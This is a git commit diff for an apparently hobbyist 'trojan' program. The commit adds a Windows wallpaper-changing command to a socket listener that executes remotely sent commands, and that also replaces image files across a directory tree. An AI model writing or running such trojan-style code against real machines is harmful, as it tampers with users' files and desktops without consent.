0720d42a5dd8f4db1d1621de71b926b5556c8e7b
Mason Moreland <mazc@protonmail.ch>
2020-08-21 14:52:34 -0700

    Implement background changing

--- src/trojan_lisa.py
+++ src/trojan_lisa.py
@@ -1,6 +1,7 @@
 import os
 import shutil
 import socket
+import ctypes
 
 class TrojanLisa:
     def __init__(self):
@@ -20,7 +21,7 @@ class TrojanLisa:
                     resp = data.decode()
                     print(resp)
                     self.execute(resp)
-                    message = "Server established"
+                    message = "Message from server"
                     conn.send(message.encode())
                 except:
                     break
@@ -39,8 +40,16 @@ class TrojanLisa:
         if command == "2":
             print("Restoring original images...")
             self.restore_images(os.curdir)
+        if command == "3":
+            print("Changing background...")
+            self.change_wallpaper()
         else:
             print("Invalid command.")
+
+    def change_wallpaper(self):
+        SPI_SETDESKWALLPAPER = 20
+        WALLPAPER_PATH = "E:\\code\\projects\\trojan_lisa\\img\\mona_lisa.jpg"
+        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, WALLPAPER_PATH , 0)
 
     """ Replace images within a specified directory and all its children """
     def replace_images(self, root_dir):
@@ -52,6 +61,7 @@ class TrojanLisa:
             
 if __name__=="__main__":
     trojan_lisa = TrojanLisa()
-    #trojan_lisa.host('0.0.0.0', 8080)
+    trojan_lisa.host('127.0.0.1', 8080)
     trojan_lisa.replace_images(".")
     trojan_lisa.restore_images(".")
+    trojan_lisa.change_wallpaper()
